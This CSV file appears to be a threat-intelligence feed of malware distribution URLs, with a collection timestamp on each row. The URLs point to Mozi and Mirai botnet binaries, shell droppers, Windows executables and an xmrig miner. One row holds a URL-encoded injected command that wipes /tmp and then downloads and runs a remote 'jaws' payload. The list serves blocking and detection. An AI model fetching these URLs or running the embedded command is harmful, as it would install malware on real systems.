"url","collect"
"http://123.13.20.251:49026/bin.sh","1672272000"
"http://123.13.20.251:49026/i","1672272000"
"http://123.13.20.251:49026/mozi.m","1672272000"
"http://123.13.27.218:37545/bin.sh","1672272000"
"http://123.13.27.218:37545/i","1672272000"
"http://123.13.29.149:42404/mozi.m","1672272000"
"http://123.130.176.242:43885/i","1672272000"
"http://123.130.176.242:43885/mozi.m","1672272000"
"http://123.130.197.142:51649/mozi.m","1672272000"
"http://123.132.179.100:50498/bin.sh","1672272000"
"http://123.132.179.100:50498/i","1672272000"
"http://123.132.179.100:50498/mozi.m","1672272000"
"http://123.133.148.155:48575/bin.sh","1672272000"
"http://123.133.148.155:48575/i","1672272000"
"http://123.135.247.9:59010/mozi.a","1672272000"
"http://123.135.247.9:59010/mozi.m","1672272000"
"http://123.14.101.53:36968/mozi.m","1672272000"
"http://123.14.115.32:39928/mozi.m","1672272000"
"http://123.14.116.98:57341/mozi.m","1672272000"
"http://123.14.13.172:41117/mozi.m","1672272000"
"http://123.14.185.200:50466/i","1672272000"
"http://123.14.192.244:55040/bin.sh","1672272000"
"http://123.14.192.244:55040/i","1672272000"
"http://123.14.192.244:55040/mozi.m","1672272000"
"http://123.14.208.139:53158/bin.sh","1672272000"
"http://123.14.208.139:53158/i","1672272000"
"http://123.14.21.148:53510/i","1672272000"
"http://123.14.21.148:53510/mozi.m","1672272000"
"http://123.14.219.35:48212/mozi.m","1672272000"
"http://123.14.251.78:57297/mozi.m","1672272000"
"http://123.14.50.180:42507/mozi.m","1672272000"
"http://123.14.92.213:35685/mozi.m","1672272000"
"http://123.159.116.154:37172/mozi.m","1672272000"
"http://123.160.201.78:36805/mozi.m","1672272000"
"http://123.173.102.235:47659/mozi.m","1672272000"
"http://123.173.5.250:56037/mozi.m","1672272000"
"http://123.175.194.143:60170/mozi.m","1672272000"
"http://123.185.9.100:34673/bin.sh","1672272000"
"http://123.185.9.100:34673/i","1672272000"
"http://123.185.9.100:34673/mozi.m","1672272000"
"http://123.193.230.110:48320/bin.sh","1672272000"
"http://123.193.230.110:48320/i","1672272000"
"http://123.194.235.37:49320/.i","1672272000"
"http://123.194.32.140:3375/.i","1672272000"
"http://123.194.35.146:1261/.i","1672272000"
"http://123.194.60.238:52754/.i","1672272000"
"http://123.194.80.69:60822/.i","1672272000"
"http://123.195.134.206:45337/.i","1672272000"
"http://123.195.60.5:42932/bin.sh","1672272000"
"http://123.195.60.5:42932/i","1672272000"
"http://123.195.60.5:42932/mozi.m","1672272000"
"http://123.195.87.10:24691/.i","1672272000"
"http://123.204.229.57:62435/.i","1672272000"
"http://123.204.230.146:45639/.i","1672272000"
"http://123.204.89.138:49835/mozi.m","1672272000"
"http://123.232.207.125:60314/mozi.m","1672272000"
"http://123.235.62.35:52164/mozi.m","1672272000"
"http://123.240.103.89:55262/.i","1672272000"
"http://123.240.143.236:33534/.i","1672272000"
"http://123.240.181.57:37716/.i","1672272000"
"http://123.240.20.187:17629/.i","1672272000"
"http://123.240.203.56:49494/bin.sh","1672272000"
"http://123.240.203.56:49494/i","1672272000"
"http://123.240.227.189:37639/.i","1672272000"
"http://123.240.7.168:45591/bin.sh","1672272000"
"http://123.240.7.168:45591/i","1672272000"
"http://123.240.79.61:64039/.i","1672272000"
"http://123.240.85.239:51713/.i","1672272000"
"http://123.241.11.41:14728/.i","1672272000"
"http://123.241.123.185:11602/.i","1672272000"
"http://123.241.127.181:50097/.i","1672272000"
"http://123.241.148.58:13553/.i","1672272000"
"http://123.241.15.98:55091/mozi.m","1672272000"
"http://123.241.57.252:65057/.i","1672272000"
"http://123.241.60.240:34083/bin.sh","1672272000"
"http://123.241.60.240:34083/i","1672272000"
"http://123.241.60.240:34083/mozi.m","1672272000"
"http://123.241.8.92:39809/mozi.m","1672272000"
"http://123.4.166.44:52456/mozi.m","1672272000"
"http://123.4.177.105:54184/i","1672272000"
"http://123.4.177.105:54184/mozi.m","1672272000"
"http://123.4.200.118:51184/mozi.m","1672272000"
"http://123.4.205.86:52895/i","1672272000"
"http://123.4.205.86:52895/mozi.a","1672272000"
"http://123.4.205.86:52895/mozi.m","1672272000"
"http://123.4.206.121:35978/mozi.a","1672272000"
"http://123.4.206.121:35978/mozi.m","1672272000"
"http://123.4.248.158:52209/mozi.m","1672272000"
"http://123.4.27.164:45757/mozi.m","1672272000"
"http://123.4.33.99:52188/mozi.m","1672272000"
"http://123.4.40.61:45457/mozi.m","1672272000"
"http://123.4.53.116:52748/mozi.m","1672272000"
"http://123.4.60.116:33987/mozi.m","1672272000"
"http://123.4.72.92:35679/mozi.m","1672272000"
"http://123.4.78.203:40985/bin.sh","1672272000"
"http://123.4.78.203:40985/i","1672272000"
"http://123.4.79.151:39846/i","1672272000"
"http://123.4.79.151:39846/mozi.m","1672272000"
"http://123.4.82.40:38308/mozi.m","1672272000"
"http://123.4.91.138:35133/bin.sh","1672272000"
"http://123.4.91.138:35133/i","1672272000"
"http://123.4.91.138:35133/mozi.m","1672272000"
"http://123.4.93.26:57731/mozi.m","1672272000"
"http://123.4.93.95:39836/mozi.m","1672272000"
"http://123.5.118.71:59084/mozi.m","1672272000"
"http://123.5.119.86:55284/i","1672272000"
"http://123.5.148.30:54903/mozi.m","1672272000"
"http://123.5.151.160:46256/mozi.a","1672272000"
"http://123.5.151.160:46256/mozi.m","1672272000"
"http://123.5.152.240:36427/bin.sh","1672272000"
"http://123.5.152.240:36427/i","1672272000"
"http://123.5.207.198:36850/mozi.m","1672272000"
"http://123.8.112.124:49988/mozi.m","1672272000"
"http://123.8.14.131:54723/mozi.m","1672272000"
"http://123.8.16.54:49956/mozi.m","1672272000"
"http://123.8.180.168:49714/mozi.m","1672272000"
"http://123.8.189.1:34025/mozi.m","1672272000"
"http://123.8.48.30:57708/mozi.a","1672272000"
"http://123.8.85.118:50484/i","1672272000"
"http://123.8.85.118:50484/mozi.m","1672272000"
"http://123.8.87.104:52393/mozi.m","1672272000"
"http://123.9.100.20:50440/mozi.m","1672272000"
"http://123.9.192.191:59245/mozi.m","1672272000"
"http://123.9.198.208:60075/mozi.m","1672272000"
"http://123.9.218.245:59044/mozi.m","1672272000"
"http://123.9.223.8:50992/bin.sh","1672272000"
"http://123.9.235.215:44751/mozi.m","1672272000"
"http://123.9.25.192:45901/mozi.m","1672272000"
"http://123.9.71.18:57559/mozi.m","1672272000"
"http://123.9.93.123:40561/i","1672272000"
"http://123.9.93.123:40561/mozi.m","1672272000"
"http://123.97.156.102:36843/mozi.m","1672272000"
"http://123.97.248.115:60229/mozi.m","1672272000"
"http://124.105.199.128:32880/.i","1672272000"
"http://124.106.33.31:62692/.i","1672272000"
"http://124.128.10.190:46479/mozi.m","1672272000"
"http://124.129.67.11:56912/bin.sh","1672272000"
"http://124.129.67.11:56912/i","1672272000"
"http://124.129.67.11:56912/mozi.m","1672272000"
"http://124.130.245.115:45221/mozi.m","1672272000"
"http://124.131.131.210:58967/mozi.m","1672272000"
"http://124.133.189.99:51798/bin.sh","1672272000"
"http://124.133.189.99:51798/i","1672272000"
"http://124.133.189.99:51798/mozi.m","1672272000"
"http://124.218.226.149:50321/.i","1672272000"
"http://124.222.18.35/match","1672272000"
"http://124.223.181.21/cwonajlbo/vtneww11212","1672272000"
"http://124.226.180.74:53575/mozi.m","1672272000"
"http://124.228.109.190:57462/mozi.a","1672272000"
"http://124.228.109.190:57462/mozi.m","1672272000"
"http://124.234.153.58:36644/bin.sh","1672272000"
"http://124.234.153.58:36644/mozi.m","1672272000"
"http://124.44.90.31:41567/.i","1672272000"
"http://124.89.9.43:47310/mozi.a","1672272000"
"http://124.89.9.43:47310/mozi.m","1672272000"
"http://124.94.91.75:16565/mozi.m","1672272000"
"http://124.95.197.1:54785/mozi.a","1672272000"
"http://124.95.197.1:54785/mozi.m","1672272000"
"http://125.104.101.226:54603/mozi.m","1672272000"
"http://125.105.178.197:47517/mozi.a","1672272000"
"http://125.105.178.197:47517/mozi.m","1672272000"
"http://125.105.196.231:55718/mozi.m","1672272000"
"http://125.105.197.177:49305/bin.sh","1672272000"
"http://125.105.4.178:47517/mozi.m","1672272000"
"http://125.109.131.149:53517/mozi.m","1672272000"
"http://125.122.59.53:35958/mozi.a","1672272000"
"http://125.122.87.105:49336/mozi.m","1672272000"
"http://125.126.100.134:50272/mozi.m","1672272000"
"http://125.126.109.209:45254/i","1672272000"
"http://125.126.244.15:59524/mozi.m","1672272000"
"http://125.136.171.66:62666/.i","1672272000"
"http://125.138.52.199:47389/.i","1672272000"
"http://125.140.155.29:61114/.i","1672272000"
"http://125.209.71.6:33831/.i","1672272000"
"http://125.211.40.181:57391/bin.sh","1672272000"
"http://125.211.40.181:57391/i","1672272000"
"http://125.211.40.181:57391/mozi.a","1672272000"
"http://125.211.40.181:57391/mozi.m","1672272000"
"http://125.24.170.32:48938/mozi.a","1672272000"
"http://125.26.22.53/scripts/23s","1672272000"
"http://125.40.2.27:44551/mozi.m","1672272000"
"http://125.40.74.115:44885/bin.sh","1672272000"
"http://125.40.74.115:44885/i","1672272000"
"http://125.40.74.115:44885/mozi.m","1672272000"
"http://125.40.74.144:54341/mozi.a","1672272000"
"http://125.40.74.217:47949/mozi.m","1672272000"
"http://125.41.10.129:51098/mozi.m","1672272000"
"http://125.41.11.146:40497/mozi.a","1672272000"
"http://125.41.138.215:55247/mozi.m","1672272000"
"http://125.41.142.79:51446/mozi.m","1672272000"
"http://125.41.15.91:33281/mozi.m","1672272000"
"http://125.41.170.152:45125/mozi.m","1672272000"
"http://125.41.211.165:58683/mozi.m","1672272000"
"http://125.41.223.144:53610/bin.sh","1672272000"
"http://125.41.223.144:53610/i","1672272000"
"http://125.41.228.45:38548/mozi.m","1672272000"
"http://125.41.231.194:38330/bin.sh","1672272000"
"http://125.41.231.194:38330/i","1672272000"
"http://125.41.232.85:50662/bin.sh","1672272000"
"http://125.41.232.85:50662/mozi.m","1672272000"
"http://125.41.5.231:49042/mozi.m","1672272000"
"http://125.41.5.3:60559/mozi.m","1672272000"
"http://125.41.6.72:54771/mozi.m","1672272000"
"http://125.41.7.93:44509/mozi.m","1672272000"
"http://125.42.10.168:50440/mozi.m","1672272000"
"http://125.42.125.230:39918/mozi.m","1672272000"
"http://125.42.127.153:45647/mozi.m","1672272000"
"http://125.42.13.17:38801/mozi.m","1672272000"
"http://125.42.227.177:42921/bin.sh","1672272000"
"http://125.42.249.107:48452/mozi.a","1672272000"
"http://125.42.25.254:47569/mozi.m","1672272000"
"http://125.43.1.22:59512/bin.sh","1672272000"
"http://125.43.1.22:59512/i","1672272000"
"http://125.43.1.22:59512/mozi.m","1672272000"
"http://125.43.118.145:55498/bin.sh","1672272000"
"http://125.43.118.145:55498/i","1672272000"
"http://125.43.187.218:49906/mozi.m","1672272000"
"http://125.43.21.58:53339/mozi.m","1672272000"
"http://125.43.227.244:36538/mozi.a","1672272000"
"http://125.43.227.244:36538/mozi.m","1672272000"
"http://125.43.254.78:35625/i","1672272000"
"http://125.43.26.249:54843/mozi.m","1672272000"
"http://125.43.27.94:42641/mozi.m","1672272000"
"http://125.43.4.152:35198/mozi.m","1672272000"
"http://125.43.80.44:34131/bin.sh","1672272000"
"http://125.43.80.44:34131/i","1672272000"
"http://125.44.195.165:54235/mozi.m","1672272000"
"http://125.44.207.153:60036/mozi.m","1672272000"
"http://125.44.214.253:57486/mozi.m","1672272000"
"http://125.44.219.7:35943/mozi.m","1672272000"
"http://125.44.223.182:49884/mozi.m","1672272000"
"http://125.44.28.244:49159/mozi.m","1672272000"
"http://125.44.37.223:55418/bin.sh","1672272000"
"http://125.44.37.223:55418/i","1672272000"
"http://125.44.44.107:39975/mozi.m","1672272000"
"http://125.44.48.215:40213/mozi.m","1672272000"
"http://125.44.68.87:57306/mozi.m","1672272000"
"http://125.44.8.76:42512/mozi.m","1672272000"
"http://125.44.9.69:55832/mozi.m","1672272000"
"http://125.45.57.166:43436/mozi.m","1672272000"
"http://125.45.67.41:38513/bin.sh","1672272000"
"http://125.46.228.5:50982/bin.sh","1672272000"
"http://125.46.228.5:50982/i","1672272000"
"http://125.46.238.217:37612/bin.sh","1672272000"
"http://125.46.238.217:37612/i","1672272000"
"http://125.47.187.92:52277/mozi.a","1672272000"
"http://125.47.203.140:57994/mozi.a","1672272000"
"http://125.47.21.75:58003/mozi.m","1672272000"
"http://125.47.246.19:36102/mozi.m","1672272000"
"http://125.47.71.81:57436/mozi.m","1672272000"
"http://125.47.91.146:38552/mozi.m","1672272000"
"http://125.83.104.253:34632/mozi.m","1672272000"
"http://127.0.0.1:80/shell/?cd%20%2Ftmp%3Brm%20-rf%20%2A%3Bwget%20193.47.61.42%2Fjaws%3Bsh%20%2Ftmp%2Fjaws","1672272000"
"http://128.116.228.168:37563/.i","1672272000"
"http://128.134.248.219:47641/.i","1672272000"
"http://128.199.240.129/jpg2awe02je10901/bioset.jpg","1672272000"
"http://128.199.240.129/jpg2awe02je10901/c.sh","1672272000"
"http://128.199.240.129/jpg2awe02je10901/f.sh","1672272000"
"http://128.199.240.129/jpg2awe02je10901/hide.jpg","1672272000"
"http://128.199.240.129/jpg2awe02je10901/scan","1672272000"
"http://128.199.240.129/php/php.sh","1672272000"
"http://128.199.240.129/php/php_8020.sh","1672272000"
"http://128.199.240.129/php/rr/make-rr.sh","1672272000"
"http://13.90.128.253/wp-content/1877.exe","1672272000"
"http://13.90.128.253/wp-content/cvshosts.exe","1672272000"
"http://13.90.128.253/wp-content/overthinker.exe","1672272000"
"http://130.180.216.232:54759/.i","1672272000"
"http://130.255.159.133:12347/.i","1672272000"
"http://1300hometutor.com.au/blog/attn_xxxxxx_12222022.zip","1672272000"
"http://134.209.72.110/ga.js","1672272000"
"http://137.175.56.104/20201117.rar","1672272000"
"http://138.207.174.248:35517/bin.sh","1672272000"
"http://138.207.174.248:35517/i","1672272000"
"http://138.99.204.224:56608/.i","1672272000"
"http://139.190.239.239:52852/bin.sh","1672272000"
"http://139.190.239.239:52852/i","1672272000"
"http://139.190.239.239:52852/mozi.m","1672272000"
"http://139.190.239.49:43851/bin.sh","1672272000"
"http://139.190.239.49:43851/mozi.m","1672272000"
"http://139.216.102.151:38475/.i","1672272000"
"http://14.241.181.118:20685/.i","1672272000"
"http://14.39.96.60:56779/.i","1672272000"
"http://14.43.119.126:14127/.i","1672272000"
"http://14.43.225.229:44053/.i","1672272000"
"http://14.45.150.88:61669/.i","1672272000"
"http://14.50.129.248:8340/.i","1672272000"
"http://14.52.211.147:30233/.i","1672272000"
"http://14.53.50.31:53999/.i","1672272000"
"http://14.54.91.154:35591/.i","1672272000"
"http://14.55.171.97:42695/.i","1672272000"
"http://14.55.75.88:64578/.i","1672272000"
"http://140.238.17.238/cx","1672272000"
"http://140.238.17.238:8899/cx","1672272000"
"http://140.255.238.106:38006/mozi.m","1672272000"
"http://141.226.27.29:5646/.i","1672272000"
"http://141.98.90.28/csaff.exe","1672272000"
"http://144.137.217.104:15250/.i","1672272000"
"http://144.139.130.6:44686/.i","1672272000"
"http://144.34.161.133/activity","1672272000"
"http://144.64.23.116:41625/.i","1672272000"
"http://146.158.87.239:21148/.i","1672272000"
"http://146.70.101.97/repackend.exe","1672272000"
"http://146.70.87.218/load/6.bat","1672272000"
"http://146.70.87.218/load/doc.dll","1672272000"
"http://147.124.209.112/datedaugust_25th_needed_dqeoywpe.png","1672272000"
"http://147.124.212.238/auth","1672272000"
"http://147.235.97.83:23799/.i","1672272000"
"http://148.170.106.128:54669/bin.sh","1672272000"
"http://148.170.106.128:54669/i","1672272000"
"http://148.170.106.128:54669/mozi.m","1672272000"
"http://149.106.149.64:9010/.i","1672272000"
"http://149.106.232.222:18708/.i","1672272000"
"http://149.127.232.17/g.pixel","1672272000"
"http://149.255.35.160/releases","1672272000"
"http://149.28.195.210/api/3","1672272000"
"http://149.28.195.210/ie9compatviewlist.xml","1672272000"
"http://149.3.85.55:50379/mozi.a","1672272000"
"http://15.164.155.60/www/handle/doc","1672272000"
"http://15.237.60.133/esperanca.liga","1672272000"
"http://150.107.195.24:60482/mozi.m","1672272000"
"http://150.107.195.41:52977/mozi.a","1672272000"
"http://150.107.195.41:52977/mozi.m","1672272000"
"http://150.107.195.41:55522/mozi.m","1672272000"
"http://150029.com/index.html/?sharename=150029.com","1672272000"
"http://150039.com/index.html/?sharename=150039.com","1672272000"
"http://150092.com/index.html/?sharename=150092.com","1672272000"
"http://150186.com/index.html/?sharename=150186.com","1672272000"
"http://150194.com/index.html/?sharename=150194.com","1672272000"
"http://150217.com/index.html/?sharename=150217.com","1672272000"
"http://150247.com/index.html/?sharename=150247.com","1672272000"
"http://150248.com/index.html/?sharename=150248.com","1672272000"
"http://150256.com/index.html/?sharename=150256.com","1672272000"
"http://150257.com/index.html/?sharename=150257.com","1672272000"
"http://150264.com/index.html/?sharename=150264.com","1672272000"
"http://150273.com/index.html/?sharename=150273.com","1672272000"
"http://150278.com/index.html/?sharename=150278.com","1672272000"
"http://150279.com/index.html/?sharename=150279.com","1672272000"
"http://150307.com/index.html/?sharename=150307.com","1672272000"
"http://150316.com/index.html/?sharename=150316.com","1672272000"
"http://150330.com/index.html/?sharename=150330.com","1672272000"
"http://150332.com/index.html/?sharename=150332.com","1672272000"
"http://150334.com/index.html/?sharename=150334.com","1672272000"
"http://150336.com/index.html/?sharename=150336.com","1672272000"
"http://150342.com/index.html/?sharename=150342.com","1672272000"
"http://150343.com/index.html/?sharename=150343.com","1672272000"
"http://150345.com/index.html/?sharename=150345.com","1672272000"
"http://150347.com/index.html/?sharename=150347.com","1672272000"
"http://150349.com/index.html/?sharename=150349.com","1672272000"
"http://150351.com/index.html/?sharename=150351.com","1672272000"
"http://150352.com/index.html/?sharename=150352.com","1672272000"
"http://151.16.41.102:57423/.i","1672272000"
"http://151.237.41.22:11296/.i","1672272000"
"http://151.73.7.224:42809/bin.sh","1672272000"
"http://151.73.7.224:42809/i","1672272000"
"http://151.73.7.224:42809/mozi.m","1672272000"
"http://151.75.56.103:19037/.i","1672272000"
"http://152.136.212.69/g.pixel","1672272000"
"http://152.171.59.67:41584/bin.sh","1672272000"
"http://152.171.59.67:41584/i","1672272000"
"http://152.171.59.67:41584/mozi.m","1672272000"
"http://152.67.40.161/itau%20node.7z","1672272000"
"http://152.67.40.161/itauadb%201234.zip","1672272000"
"http://154.126.178.16:30629/.i","1672272000"
"http://154.204.43.31/fwlink","1672272000"
"http://154.209.74.154/fam_cart","1672272000"
"http://154.68.175.45:42341/.i","1672272000"
"http://154.92.15.67/pixel","1672272000"
"http://155.133.23.244/d.php","1672272000"
"http://155.138.150.70/pixel.gif","1672272000"
"http://155.254.14.103:51336/.i","1672272000"
"http://156.96.156.177:222/x.png","1672272000"
"http://157.122.107.130:60136/mozi.m","1672272000"
"http://157.122.108.110:41429/mozi.m","1672272000"
"http://157.122.110.109:53561/mozi.m","1672272000"
"http://157.245.36.27/~dokterpol/?page=14914169539334","1672272000"
"http://160.177.123.191:45102/mozi.m","1672272000"
"http://160.178.156.212:49785/mozi.m","1672272000"
"http://160.202.52.114:51641/mozi.a","1672272000"
"http://162.14.82.171/activity","1672272000"
"http://162.14.97.126/dpixel","1672272000"
"http://162.231.198.11:49974/.i","1672272000"
"http://163.123.143.126/bins/dark.arm","1672272000"
"http://163.123.143.126/bins/dark.arm7","1672272000"
"http://163.123.143.126/bins/dark.mpsl","1672272000"
"http://163.123.143.126/bins/dark.x86","1672272000"
"http://163.123.143.4/download/ww20.exe","1672272000"
"http://163.123.143.4/proxies.txt","1672272000"
"http://163.125.123.197:60002/mozi.m","1672272000"
"http://163.125.14.112:59843/mozi.m","1672272000"
"http://163.125.171.211:45973/mozi.m","1672272000"
"http://163.142.101.238:48797/mozi.a","1672272000"
"http://163.142.123.229:58329/mozi.m","1672272000"
"http://163.179.160.147:40275/mozi.a","1672272000"
"http://163.179.160.147:40275/mozi.m","1672272000"
"http://163.179.163.16:35060/mozi.a","1672272000"
"http://163.179.163.16:40851/mozi.m","1672272000"
"http://163.179.167.45:36479/mozi.m","1672272000"
"http://163.179.169.78:52408/mozi.a","1672272000"
"http://163.179.169.78:52408/mozi.m","1672272000"
"http://163.179.170.220:42139/mozi.a","1672272000"
"http://163.179.170.220:42139/mozi.m","1672272000"
"http://163.179.170.65:38115/mozi.a","1672272000"
"http://163.179.171.52:39232/mozi.m","1672272000"
"http://163.179.171.64:60094/mozi.m","1672272000"
"http://163.179.172.156:55490/mozi.m","1672272000"
"http://163.179.172.191:40622/mozi.m","1672272000"
"http://163.179.173.194:37798/mozi.a","1672272000"
"http://163.179.174.202:40090/mozi.a","1672272000"
"http://163.179.175.59:50420/mozi.m","1672272000"
"http://163.179.217.127:59462/mozi.a","1672272000"
"http://163.179.217.127:59462/mozi.m","1672272000"
"http://163.179.217.78:36029/mozi.a","1672272000"
"http://163.179.232.114:37895/mozi.m","1672272000"
"http://163.179.232.58:60372/mozi.m","1672272000"
"http://163.179.232.87:48178/mozi.m","1672272000"
"http://163.179.233.15:46866/mozi.m","1672272000"
"http://163.179.234.248:58679/mozi.m","1672272000"
"http://163.179.235.79:59807/mozi.m","1672272000"
"http://163.179.243.111:37186/mozi.a","1672272000"
"http://163.204.210.178:38939/mozi.m","1672272000"
"http://163.204.212.149:40886/mozi.a","1672272000"
"http://163.204.212.149:40886/mozi.m","1672272000"
"http://163.204.212.201:46429/mozi.a","1672272000"
"http://163.204.212.201:46429/mozi.m","1672272000"
"http://163.204.213.142:54918/mozi.a","1672272000"
"http://163.204.213.71:43865/mozi.a","1672272000"
"http://163.204.213.71:43865/mozi.m","1672272000"
"http://163.204.214.118:48769/mozi.m","1672272000"
"http://163.204.215.181:56280/mozi.m","1672272000"
"http://163.204.215.235:45412/mozi.m","1672272000"
"http://163.204.218.137:47009/mozi.a","1672272000"
"http://163.204.220.88:35084/mozi.m","1672272000"
"http://163.204.222.59:54649/mozi.m","1672272000"
"http://163.204.223.143:43029/mozi.m","1672272000"
"http://163.47.209.169:8261/.i","1672272000"
"http://165.90.16.5:18437/.i","1672272000"
"http://167.88.170.23/43.exe","1672272000"
"http://167.88.170.23/s101.exe","1672272000"
"http://168.121.239.172:6568/.i","1672272000"
"http://171.117.77.220:15951/mozi.a","1672272000"
"http://171.119.254.211:55973/mozi.a","1672272000"
"http://171.123.145.117:53133/i","1672272000"
"http://171.123.145.117:53133/mozi.a","1672272000"
"http://171.123.186.21:43457/mozi.m","1672272000"
"http://171.123.239.66:36601/mozi.m","1672272000"
"http://171.124.124.130:42063/mozi.m","1672272000"
"http://171.124.126.101:34773/mozi.m","1672272000"
"http://171.125.238.197:35908/bin.sh","1672272000"
"http://171.125.238.197:35908/mozi.a","1672272000"
"http://171.125.247.157:53207/mozi.a","1672272000"
"http://171.125.247.157:53207/mozi.m","1672272000"
"http://171.22.30.106/library.php%29j","1672272000"
"http://171.22.30.106/library.php&","1672272000"
"http://171.22.30.106/library.php/j","1672272000"
"http://171.22.30.106/library.php106/library.php;r","1672272000"
"http://171.22.30.106/library.php106/library.phped","1672272000"
"http://171.22.30.106/library.php1ur","1672272000"
"http://171.22.30.106/library.php21","1672272000"
"http://171.22.30.106/library.php6h","1672272000"
"http://171.22.30.106/library.php;n","1672272000"
"http://171.22.30.106/library.php;r","1672272000"
"http://171.22.30.106/library.php;w","1672272000"
"http://171.22.30.106/library.php_","1672272000"
"http://171.22.30.106/library.phpb9a","1672272000"
"http://171.22.30.106/library.phpc","1672272000"
"http://171.22.30.106/library.phpg","1672272000"
"http://171.22.30.106/library.phpjt","1672272000"
"http://171.22.30.106/library.phpkt","1672272000"
"http://171.22.30.106/library.phpl","1672272000"
"http://171.22.30.106/library.phpl1","1672272000"
"http://171.22.30.106/library.phpmicrosoft","1672272000"
"http://171.22.30.106/library.phpn","1672272000"
"http://171.22.30.106/library.phpn1","1672272000"
"http://171.22.30.106/library.phptv","1672272000"
"http://171.22.30.106/library.phpuv","1672272000"
"http://171.22.30.106/library.phpx","1672272000"
"http://171.22.30.106/library.phpy","1672272000"
"http://171.22.30.106/library.phpyjo","1672272000"
"http://171.22.30.106/library.phpz","1672272000"
"http://171.22.30.106/library.phpzz","1672272000"
"http://171.22.30.173/bins/arm","1672272000"
"http://171.22.30.173/bins/arm5","1672272000"
"http://171.22.30.173/bins/arm6","1672272000"
"http://171.22.30.173/bins/arm7","1672272000"
"http://171.22.30.173/bins/m68k","1672272000"
"http://171.22.30.173/bins/mips","1672272000"
"http://171.22.30.173/bins/mpsl","1672272000"
"http://171.22.30.173/bins/ppc","1672272000"
"http://171.22.30.173/bins/sh4","1672272000"
"http://171.22.30.173/bins/x86","1672272000"
"http://171.223.27.212:32831/mozi.m","1672272000"
"http://171.237.4.119:2239/.i","1672272000"
"http://171.35.243.103:56680/mozi.a","1672272000"
"http://171.35.61.87:44767/mozi.a","1672272000"
"http://171.35.61.87:44767/mozi.m","1672272000"
"http://171.36.144.36:50207/i","1672272000"
"http://171.36.144.36:50207/mozi.m","1672272000"
"http://171.36.52.67:43596/mozi.m","1672272000"
"http://171.38.144.239:43130/mozi.a","1672272000"
"http://171.38.144.239:43130/mozi.m","1672272000"
"http://171.38.146.103:36418/mozi.a","1672272000"
"http://171.38.146.251:34484/mozi.m","1672272000"
"http://171.38.147.176:56020/mozi.a","1672272000"
"http://171.38.147.176:56020/mozi.m","1672272000"
"http://171.38.148.173:57768/mozi.a","1672272000"
"http://171.38.148.173:57768/mozi.m","1672272000"
"http://171.38.150.36:54299/mozi.a","1672272000"
"http://171.38.150.36:54299/mozi.m","1672272000"
"http://171.38.194.255:48432/mozi.a","1672272000"
"http://171.38.219.58:60160/mozi.m","1672272000"
"http://171.38.223.2:47512/mozi.m","1672272000"
"http://171.40.9.216:48200/mozi.m","1672272000"
"http://171.44.226.127:37582/mozi.m","1672272000"
"http://171.81.121.230:50427/bin.sh","1672272000"
"http://171.81.121.230:50427/i","1672272000"
"http://171.81.121.230:50427/mozi.a","1672272000"
"http://171.81.93.131:44336/bin.sh","1672272000"
"http://171.81.93.131:44336/i","1672272000"
"http://172.104.170.240/snunewa.tar","1672272000"
"http://172.105.211.21/snunewa.tar","1672272000"
"http://172.105.211.21/xmrig","1672272000"
"http://172.245.142.35/77.bmp","1672272000"
"http://172.245.25.166/771/vbc.exe","1672272000"
"http://172.245.25.166/772/vbc.exe","1672272000"
"http://172.88.228.41:41689/.i","1672272000"
"http://173.162.167.126:64180/.i","1672272000"
"http://173.165.45.229:41349/bin.sh","1672272000"
"http://173.165.45.229:41349/i","1672272000"
"http://173.165.45.229:41349/mozi.m","1672272000"
"http://173.166.254.186:1237/.i","1672272000"
"http://173.181.68.74:24981/.i","1672272000"
"http://173.19.245.229:36482/mozi.a","1672272000"
"http://173.19.245.229:36482/mozi.m","1672272000"
"http://173.220.79.82:53388/.i","1672272000"
"http://173.235.63.36:6559/.i","1672272000"
"http://173.25.113.8:24835/.i","1672272000"
"http://173.255.249.221/activity","1672272000"
"http://173.70.54.9:38469/bin.sh","1672272000"
"http://173.70.54.9:38469/i","1672272000"
"http://173.82.115.170/mirai.arm","1672272000"
"http://173.82.115.170/mirai.arm7","1672272000"
"http://173.82.115.170/mirai.m68k","1672272000"
"http://173.82.115.170/mirai.mips","1672272000"
"http://173.82.115.170/mirai.mpsl","1672272000"
"http://173.82.115.170/mirai.ppc","1672272000"
"http://173.82.115.170/mirai.sh4","1672272000"
"http://173.82.115.170/mirai.spc","1672272000"
"http://173.82.115.170/mirai.x86","1672272000"
"http://173.82.206.184/g.pixel","1672272000"
"http://174.61.16.45:31757/.i","1672272000"
"http://174.83.125.86:9908/.i","1672272000"
"http://174.83.73.163:56256/bin.sh","1672272000"
"http://174.83.73.163:56256/i","1672272000"
"http://174.83.73.163:56256/mozi.a","1672272000"
